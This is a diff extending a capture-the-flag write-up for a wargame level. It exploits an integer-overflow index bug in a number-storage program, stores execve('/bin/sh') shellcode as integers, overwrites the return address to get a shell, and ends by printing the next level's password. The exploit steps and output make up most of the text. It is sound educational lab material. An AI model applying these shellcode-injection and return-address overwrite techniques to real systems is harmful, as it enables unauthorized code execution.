@@ -130,5 +130,96 @@ Stack level 0, frame at 0xffffd6e0:
 (gdb) x $ebp+0x8
 0xffffd4f0:	0xffffd514
 
-# Now we find the offset AND ZIOUM
+# Now we find the offset AND ZIOUM (eip - array)
+> 0xffffd6dc - 0xffffd514
+456 
+> _ / 4
+114.0     # Have have a div by 3 index (School trick, sum all num (1+1+4 = 6) if it's multiple of 3 your number is too
 
+# So we need to use u_int property again
+1073741824 + 114 = 1073741938
+
+> Input command: store
+ Number: 12
+ Index: 1073741938
+ Completed store command successfully
+> Input command: read
+ Index: 114
+ Number at data[114] is 12
+ Completed read command successfully
+> Input command: quit
+Segmentation fault (core dumped)        # Segfault cause we override, main return, if you don't get why, read again stack functionement
+
+# Let's store our shellcode (split 4 bytes, format to endian used, convert to int and store to index from 0 to x)
+"\x6a\x0b\x58\x99" "\x52\x68\x2f\x2f" \x73\x68\x68\x2f" "\x62\x69\x6e\x89" "\xe3\x31\xc9\xcd" "\x80"
+[0] -> [1073741824] = \x99\x58\x0b\x6a = 2572684138
+[1] = \x2f\x2f\x68\x52 = 791636050
+[2] = \x2f\x68\x68\x73 = 795371635
+[3] -> [1073741827] = \x89\x6e\x69\x62 = 2305714530
+[4] = \xcd\xc9\x31\xe3 = 3452514787
+[5] = \x80 = 128
+
+[114] -> [1073741938] = 0xffffd514 = 4294956308
+# Not working, the stack is probably ramble a bit so we don't have the correct address
+# We can try to find it during the execution, since we previously found the adress we can use it (0xffffd4f0:	0xffffd514)
+> 0xffffd4f0 - 0xffffd514
+-36
+> _ / 4
+-9.0
+
+# Ok we test run exploit, read [-9] during exec, then store the value in [114]
+
+------/tmp/exploit------
+store
+2572684138
+1073741824
+store
+791636050
+1
+store
+795371635
+2
+store
+2305714530
+1073741827
+store
+3452514787
+4
+store
+128
+5
+------------------------
+
+
+# WE GO BRRRR
+> cat /tmp/exploit - | ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+read
+Input command:  Index: -9
+ Number at data[4294967287] is 4294956356
+ Completed read command successfully
+store
+Input command:  Number: 4294956356
+ Index: 1073741938
+ Completed store command successfully
+quit
+whoami
+level08
+cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
